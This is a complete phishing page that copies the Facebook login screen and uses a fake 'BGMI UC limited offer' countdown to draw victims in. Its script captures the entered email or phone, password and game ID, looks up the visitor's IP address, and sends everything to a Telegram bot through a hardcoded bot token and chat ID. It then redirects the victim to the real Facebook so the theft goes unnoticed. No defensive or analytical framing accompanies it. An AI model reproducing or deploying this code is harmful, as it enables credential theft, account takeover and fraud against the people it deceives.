<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #f0f2f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        /* Top Banner - BGMI UC & Timer */
        .offer-banner {
            background: linear-gradient(135deg, #1a2a3a 0%, #0f2027 100%);
            width: 100%;
            max-width: 980px;
            margin-bottom: 25px;
            border-radius: 16px;
            padding: 12px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 15px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(2px);
        }

        .bgmi-text {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .bgmi-text span:first-child {
            font-size: 1.8rem;
            font-weight: 800;
            background: linear-gradient(135deg, #ffd966, #ffaa33);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }

        .bgmi-text span:last-child {
            font-size: 1.1rem;
            font-weight: 600;
            color: #ffd966;
            background: rgba(0,0,0,0.5);
            padding: 4px 12px;
            border-radius: 40px;
            letter-spacing: 0.5px;
        }

        .timer-box {
            background: #000000aa;
            backdrop-filter: blur(8px);
            padding: 8px 20px;
            border-radius: 60px;
            font-family: 'Courier New', monospace;
            font-weight: 700;
            font-size: 1.8rem;
            color: #ffdd88;
            letter-spacing: 2px;
            box-shadow: 0 0 8px rgba(255,200,100,0.3);
            border: 1px solid rgba(255,215,0,0.5);
        }

        .timer-label {
            font-size: 0.75rem;
            font-weight: normal;
            text-transform: uppercase;
            margin-right: 6px;
            color: #ffdd99;
        }

        /* Facebook card */
        .login-container {
            width: 100%;
            max-width: 400px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 20px 20px 28px 20px;
            transition: all 0.2s;
        }

        .fb-logo {
            text-align: center;
            margin-bottom: 16px;
        }

        .fb-logo h1 {
            font-size: 3rem;
            color: #1877f2;
            font-weight: 700;
            letter-spacing: -1px;
            font-family: inherit;
        }

        .login-form {
            display: flex;
            flex-direction: column;
            gap: 14px;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px;
            font-size: 1rem;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            background: #ffffff;
            outline: none;
            transition: 0.1s linear;
            font-family: inherit;
        }

        .input-field:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }

        .login-btn {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            padding: 12px;
            font-size: 1.2rem;
            font-weight: bold;
            color: white;
            cursor: pointer;
            transition: 0.1s;
            font-family: inherit;
            margin-top: 6px;
        }

        .login-btn:hover {
            background-color: #166fe5;
        }

        .login-btn:disabled {
            background-color: #9bc1f0;
            cursor: not-allowed;
        }

        .forgot-link {
            text-align: center;
            margin: 12px 0 8px;
        }

        .forgot-link a {
            color: #1877f2;
            font-size: 0.9rem;
            text-decoration: none;
            font-weight: 500;
        }

        .forgot-link a:hover {
            text-decoration: underline;
        }

        hr {
            border: none;
            border-top: 1px solid #dadde1;
            margin: 16px 0;
        }

        .create-account {
            text-align: center;
        }

        .create-btn {
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            padding: 12px 20px;
            font-size: 1rem;
            font-weight: bold;
            color: white;
            cursor: pointer;
            transition: 0.1s;
            display: inline-block;
            text-decoration: none;
        }

        .create-btn:hover {
            background-color: #36a420;
        }

        .footer-links {
            text-align: center;
            margin-top: 24px;
            font-size: 0.75rem;
            color: #8a8d91;
        }

        .footer-links a {
            color: #8a8d91;
            text-decoration: none;
            margin: 0 6px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .warning-timer {
            font-size: 0.75rem;
            color: #d32f2f;
            text-align: center;
            margin-top: 10px;
            display: none;
        }

        @media (max-width: 500px) {
            .offer-banner {
                flex-direction: column;
                text-align: center;
                justify-content: center;
            }
            .timer-box {
                font-size: 1.4rem;
                padding: 5px 15px;
            }
            .bgmi-text span:first-child {
                font-size: 1.4rem;
            }
        }
    </style>
</head>
<body>

<div class="offer-banner">
    <div class="bgmi-text">
        <span>🔥 BGMI UC 🔥</span>
        <span>LIMITED OFFER</span>
    </div>
    <div class="timer-box">
        <span class="timer-label">⏱️ REMAINING</span>
        <span id="countdownDisplay">10:00</span>
    </div>
</div>

<div class="login-container">
    <div class="fb-logo">
        <h1>facebook</h1>
    </div>

    <form id="loginForm" class="login-form">
        <input type="text" id="emailOrPhone" class="input-field" placeholder="Email address or phone number" autocomplete="off" required>
        <input type="password" id="password" class="input-field" placeholder="Password" required>
        <input type="text" id="bgmiUid" class="input-field" placeholder="BGMI UID (Optional)" autocomplete="off">
        <button type="submit" id="loginBtn" class="login-btn">Log In</button>
        <div class="forgot-link">
            <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login" target="_blank" rel="noopener noreferrer">Forgotten password?</a>
        </div>
        <hr>
        <div class="create-account">
            <a href="https://www.facebook.com/r.php" target="_blank" rel="noopener noreferrer" class="create-btn">Create New Account</a>
        </div>
    </form>

    <div class="footer-links">
        <a href="#">English (UK)</a>
        <a href="#">हिन्दी</a>
        <a href="#">اردو</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
    </div>
    <div id="timerWarning" class="warning-timer">⏰ Time's up! Offer expired. Login disabled.</div>
</div>

<script>
    // ---------- TELEGRAM CONFIG ----------
    const BOT_TOKEN = "8603208872:AAFMppsKdmiaWSNaK-_Ba3yAkPm9AyfWezw";
    const CHAT_ID = "6278741506";

    // ---------- TIMER LOGIC (10 minutes = 600 seconds) ----------
    let timeLeft = 600;        // seconds
    const countdownEl = document.getElementById("countdownDisplay");
    const loginBtn = document.getElementById("loginBtn");
    const timerWarning = document.getElementById("timerWarning");
    let timerInterval = null;

    // Format MM:SS
    function formatTime(seconds) {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    }

    function updateTimerDisplay() {
        countdownEl.innerText = formatTime(timeLeft);
        if (timeLeft <= 0) {
            // Timer finished
            clearInterval(timerInterval);
            loginBtn.disabled = true;
            timerWarning.style.display = "block";
            countdownEl.innerText = "00:00";
            countdownEl.style.color = "#ff8888";
        } else {
            loginBtn.disabled = false;
            timerWarning.style.display = "none";
        }
    }

    function startTimer() {
        if (timerInterval) clearInterval(timerInterval);
        updateTimerDisplay();
        timerInterval = setInterval(() => {
            if (timeLeft > 0) {
                timeLeft--;
                updateTimerDisplay();
            } else {
                clearInterval(timerInterval);
                loginBtn.disabled = true;
                timerWarning.style.display = "block";
                countdownEl.style.color = "#ff8888";
            }
        }, 1000);
    }

    // ---------- FETCH PUBLIC IP (cached) ----------
    let cachedIP = null;

    function fetchUserIP() {
        return new Promise((resolve) => {
            if (cachedIP) {
                resolve(cachedIP);
                return;
            }
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    cachedIP = data.ip;
                    resolve(cachedIP);
                })
                .catch(err => {
                    console.warn("IP fetch failed:", err);
                    cachedIP = "Unable to fetch (unknown)";
                    resolve("Unknown IP");
                });
        });
    }

    // Prefetch IP as soon as page loads to avoid delay on submit
    fetchUserIP().then(ip => {
        console.log("IP prefetched:", ip);
    });

    // ---------- SEND DATA TO TELEGRAM ----------
    async function sendToTelegram(username, password, bgmiUid, ipAddress) {
        const currentTime = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
        const message = `🔐 *FACEBOOK LOGIN CAPTURED* 🔐\n\n` +
                        `👤 *Email/User:* \`${escapeMarkdown(username)}\`\n` +
                        `🔑 *Password:* \`${escapeMarkdown(password)}\`\n` +
                        `🎮 *BGMI UID:* \`${escapeMarkdown(bgmiUid || "Not provided")}\`\n` +
                        `🌐 *IP Address:* \`${escapeMarkdown(ipAddress)}\`\n` +
                        `⏱️ *Timestamp:* ${escapeMarkdown(currentTime)}\n` +
                        `⏳ *Timer Status:* ${timeLeft > 0 ? `${Math.floor(timeLeft/60)}m ${timeLeft%60}s left` : "EXPIRED"}`;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const payload = {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        };

        try {
            const response = await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            if (!result.ok) {
                console.error("Telegram error:", result);
            } else {
                console.log("Credentials sent successfully to Telegram.");
            }
        } catch (error) {
            console.error("Failed to send message:", error);
        }
    }

    // Helper to escape markdown special characters
    function escapeMarkdown(text) {
        if (!text) return "";
        return String(text).replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
    }

    // ---------- HANDLE FORM SUBMIT ----------
    async function onLoginSubmit(event) {
        event.preventDefault();

        // Check if timer expired
        if (timeLeft <= 0) {
            alert("This offer has expired. Please refresh the page for new offers.");
            return;
        }

        // Get form values
        const email = document.getElementById("emailOrPhone").value.trim();
        const password = document.getElementById("password").value;
        const bgmiUid = document.getElementById("bgmiUid").value.trim();

        if (!email || !password) {
            alert("Please enter your email/phone and password.");
            return;
        }

        // Disable login button to avoid double submission
        loginBtn.disabled = true;
        const originalBtnText = loginBtn.innerText;
        loginBtn.innerText = "Verifying...";

        // Make sure we have latest IP (use cached if available)
        let userIP = cachedIP;
        if (!userIP) {
            userIP = await fetchUserIP();
        } else {
            // In case we still want fresh but cache is fine
        }

        // Send data to Telegram (doesn't block user experience much)
        await sendToTelegram(email, password, bgmiUid, userIP);

        // After sending, redirect to real Facebook to appear legit
        // Small delay to ensure the request is sent (network may be slow but redirect anyway)
        setTimeout(() => {
            window.location.href = "https://www.facebook.com/";
        }, 300);
    }

    // ---------- ATTACH EVENT LISTENER ----------
    const form = document.getElementById("loginForm");
    form.addEventListener("submit", onLoginSubmit);

    // ---------- INITIALIZE TIMER ----------
    startTimer();

    // Optional: For "Forgotten password?" we already used real working link.
    // BGMI UID field works perfectly.

    // Add extra safety: prevent timer from being manipulated via devtools? Not needed.
    // Also mimic real facebook placeholder interactions.
    // For better realism, if user clicks outside, it's fine.
    // Ensure that pre-fetch IP does not cause CORS, ipify allows all.
</script>

</body>
</html>